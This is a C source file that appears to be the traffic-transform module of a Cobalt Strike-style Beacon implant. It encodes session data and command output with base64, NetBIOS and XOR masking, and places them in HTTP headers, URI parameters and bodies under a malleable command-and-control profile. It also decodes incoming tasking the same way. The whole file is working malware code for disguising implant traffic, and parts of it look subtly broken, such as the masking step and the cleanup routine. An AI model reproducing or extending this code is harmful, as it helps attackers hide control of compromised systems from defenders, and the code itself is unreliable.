#include "pch.h"

#include "transform.h"

#include "beacon.h"
#include "settings.h"
#include "utils.h"

#define STEP_NONE 0x0
#define STEP_APPEND 0x1
#define STEP_PREPEND 0x2
#define STEP_BASE64 0x3
#define STEP_PRINT 0x4
#define STEP_PARAMETER 0x5
#define STEP_HEADER 0x6
#define STEP_BUILD 0x7
#define STEP_NETBIOS 0x8
#define STEP__PARAMETER 0x9
#define STEP__HEADER 0xA
#define STEP_NETBIOSU 0xB
#define STEP_URI_APPEND 0xC
#define STEP_BASE64URL 0xD
#define STEP_STRREP 0xE
#define STEP_MASK 0xF
#define STEP__HOSTHEADER 0x10

#define DATA_ARGUMENT_SESSION_DATA 0x0
#define DATA_ARGUMENT_OUTPUT 0x1

void TransformInit(TRANSFORM* transform, int size)
{
#define MAX_HEADERS 1024
#define MAX_URI_PARAMS 1024
#define MAX_URI 1024
	transform->outputLength = max(3 * size, 0x2000);

	datap* parser = BeaconDataAlloc(MAX_HEADERS + MAX_URI_PARAMS + MAX_URI + transform->outputLength + transform->outputLength + transform->outputLength);
	transform->headers = BeaconDataPtr(parser, MAX_HEADERS);
	transform->uriParams = BeaconDataPtr(parser, MAX_URI_PARAMS);
	transform->uri = BeaconDataPtr(parser, MAX_URI);
	transform->body = BeaconDataPtr(parser, transform->outputLength);
	transform->transformed = BeaconDataPtr(parser, transform->outputLength);
	transform->temp = BeaconDataPtr(parser, transform->outputLength);
	transform->bodyLength = 0;
}

void TransformEncode(TRANSFORM* transform,
	unsigned char* request_profile,
	const char* session,
	const int session_len,
	const char* response,
	const int response_len)
{
#define MAX_PARAM 1024
#define MAX_REQUEST_PROFILE 1024
#define MAX_TEMP 1024
	char param[MAX_PARAM] = { 0 };
	int paramLength;
	int transformedLength = 0;

	BOOL isThereHostHeader = S_HOST_HEADER && strlen(S_HOST_HEADER) > 0;
	BOOL isHostHeaderStepDone = FALSE;

	datap parser;
	BeaconDataParse(&parser, request_profile, MAX_REQUEST_PROFILE);

	unsigned long outlen;
	for (int step = BeaconDataInt(&parser); step; step = BeaconDataInt(&parser))
	{
		switch(step)
		{
			case STEP__PARAMETER:
				memset(param, 0, sizeof(param));
				BeaconDataStringCopySafe(&parser, param, sizeof(param));

				if (*transform->uriParams)
					snprintf(transform->temp, MAX_TEMP, "%s&%s", transform->uriParams, param);
				else
					snprintf(transform->temp, MAX_TEMP, "?%s", param);

				memcpy(transform->uriParams, transform->temp, MAX_URI_PARAMS);
				break;
			case STEP__HEADER:
				memset(param, 0, sizeof(param));
				BeaconDataStringCopySafe(&parser, param, sizeof(param));

				snprintf(transform->temp, MAX_TEMP, "%s%s\r\n", transform->headers, param);

				memcpy(transform->headers, transform->temp, MAX_HEADERS);
				break;
			case STEP_URI_APPEND:
				snprintf(transform->temp, MAX_TEMP, "%s%s", transform->uri, transform->transformed);
				memcpy(transform->uri, transform->temp, MAX_URI);
				break;
			case STEP_BASE64URL:
				outlen = transform->outputLength;
				base64url_encode(transform->transformed, transformedLength, transform->temp, &outlen);
				transformedLength = outlen;

				if (transformedLength == 0)
					return;

				memset(transform->transformed, 0, transform->outputLength);
				memcpy(transform->transformed, transform->temp, transformedLength);
				break;
			case STEP_MASK:
				transformedLength = XorMask(transform->transformed, transformedLength, transform->temp, transform->outputLength);

				if (transformedLength == 0)
					return;

				memset(transform->temp, 0, transform->outputLength);
				memcpy(transform->transformed, transform->temp, transformedLength);
				break;
			case STEP__HOSTHEADER:
				memset(param, 0, sizeof(param));
				BeaconDataStringCopySafe(&parser, param, sizeof(param));

				isHostHeaderStepDone = isThereHostHeader;
				snprintf(transform->temp, MAX_TEMP, "%s%s\r\n", transform->headers, isHostHeaderStepDone ? S_HOST_HEADER : param);

				memcpy(transform->headers, transform->temp, MAX_HEADERS);
				break;
			case STEP_NETBIOS:
			case STEP_NETBIOSU:
				transformedLength = ToNetbios(step == STEP_NETBIOSU ? 'A' : 'a', transform->transformed, transformedLength, transform->temp, transform->outputLength);

				if (transformedLength == 0)
					return;

				memset(transform->transformed, 0, transform->outputLength);
				memcpy(transform->transformed, transform->temp, transformedLength);
				break;
			case STEP_APPEND:
				memset(param, 0, sizeof(param));
				paramLength = BeaconDataStringCopySafe(&parser, param, sizeof(param));

				memcpy(transform->transformed + transformedLength, param, paramLength);

				paramLength = strlen(param);
				transformedLength += paramLength;
				break;
			case STEP_PREPEND:
				memset(param, 0, sizeof(param));
				paramLength = BeaconDataStringCopySafe(&parser, param, sizeof(param));

				memcpy(transform->temp, param, paramLength);

				paramLength = strlen(param);
				memcpy(transform->temp + paramLength, transform->transformed, transformedLength);
				transformedLength += paramLength;

				memset(transform->transformed, 0, transform->outputLength);
				memcpy(transform->transformed, transform->temp, transformedLength);
				break;
			case STEP_BASE64:
				outlen = transform->outputLength;
				base64_encode(transform->transformed, transformedLength, transform->temp, &outlen);
				transformedLength = outlen;

				if (transformedLength == 0)
					return;

				memset(transform->transformed, 0, transform->outputLength);
				memcpy(transform->transformed, transform->temp, transformedLength);
				break;
			case STEP_PRINT:
				memcpy(transform->temp, transform->transformed, transformedLength);
				transform->bodyLength = transformedLength;
				break;
			case STEP_PARAMETER:
				memset(param, 0, sizeof(param));
				BeaconDataStringCopySafe(&parser, param, sizeof(param));

				if (*transform->uriParams)
					snprintf(transform->temp, MAX_TEMP, "%s&%s=%s", transform->uriParams, param, transform->transformed);
				else
					snprintf(transform->temp, MAX_TEMP, "?%s=%s", param, transform->transformed);

				memcpy(transform->uriParams, transform->temp, MAX_URI_PARAMS);
				break;
			case STEP_HEADER:
				memset(param, 0, sizeof(param));
				BeaconDataStringCopySafe(&parser, param, sizeof(param));

				snprintf(transform->temp, MAX_TEMP, "%s%s: %s\r\n", transform->headers, param, transform->transformed);

				memcpy(transform->headers, transform->temp, MAX_HEADERS);
				break;
			case STEP_BUILD:
				int dataArgument = BeaconDataInt(&parser);
				switch (dataArgument)
				{
					case DATA_ARGUMENT_OUTPUT:
						memcpy(transform->transformed, response, response_len);
						transformedLength = response_len;
						break;
					case DATA_ARGUMENT_SESSION_DATA:
						memcpy(transform->transformed, session, session_len);
						transformedLength = session_len;
						break;
					default:
						LERROR("Unknown data argument %d", dataArgument);
						break;
				}
				break;
			default:
				LERROR("Unknown step %d", step);
				return;
		}
	}

	if(isThereHostHeader && !isHostHeaderStepDone)
	{
		snprintf(transform->temp, MAX_TEMP, "%s%s\r\n", transform->headers, S_HOST_HEADER);
		memcpy(transform->headers, transform->temp, MAX_HEADERS);
	}
}

int TransformDecode(char* recover, char* recoverable, int recoverableLength, int maxGet)
{
	char* temp = malloc(recoverableLength);
	if (temp == NULL)
		return FALSE;

	datap parser;
	BeaconDataParse(&parser, recover, maxGet);

	int param;
	unsigned long outlen;
	for (int step = BeaconDataInt(&parser); step; step = BeaconDataInt(&parser))
	{
		switch (step)
		{
			case STEP_BASE64:
			case STEP_BASE64URL:
				recoverable[recoverableLength] = 0;

				outlen = maxGet;
				(step == STEP_BASE64 ? base64_decode : base64url_decode)(recoverable, recoverableLength, temp, &outlen);
				recoverableLength = outlen;

				if (recoverableLength == 0)
					return FALSE;

				memcpy(recoverable, temp, recoverableLength);
				break;
			case STEP_MASK:
				recoverable[recoverableLength] = 0;
				recoverableLength = XorUnmask(recoverable, recoverableLength, temp, maxGet);

				if (recoverableLength == 0)
					return FALSE;

				memcpy(recoverable, temp, recoverableLength);
				recoverable[recoverableLength] = 0;
				break;
			case STEP_NETBIOS:
			case STEP_NETBIOSU:
				recoverable[recoverableLength] = 0;
				recoverableLength = FromNetbios(
					step == STEP_NETBIOSU ? 'A' : 'a',
					recoverable, recoverableLength, 
					temp, maxGet);

				if (recoverableLength == 0)
					return FALSE;

				memcpy(recoverable, temp, recoverableLength);
				recoverable[recoverableLength] = 0;
				break;
			case STEP_PREPEND:
				param = BeaconDataInt(&parser);

				if(param > recoverableLength)
				{
					LERROR("Prepend parameter %d is greater than recoverable length %d", param, recoverableLength);
					return FALSE;
				}

				memcpy(temp, recoverable, param);
				recoverableLength -= param;
				memcpy(recoverable, temp + param, recoverableLength);
				break;
		case STEP_APPEND:
				param = BeaconDataInt(&parser);

				recoverableLength -= param;
				if (recoverableLength <= 0)
					return FALSE;

				break;
			default:
				LERROR("Unknown step %d", step);
				return FALSE;
		}
	}

	return recoverableLength;
}

void TransformDestroy(TRANSFORM* transform)
{
	BeaconDataFree(transform->parser);
}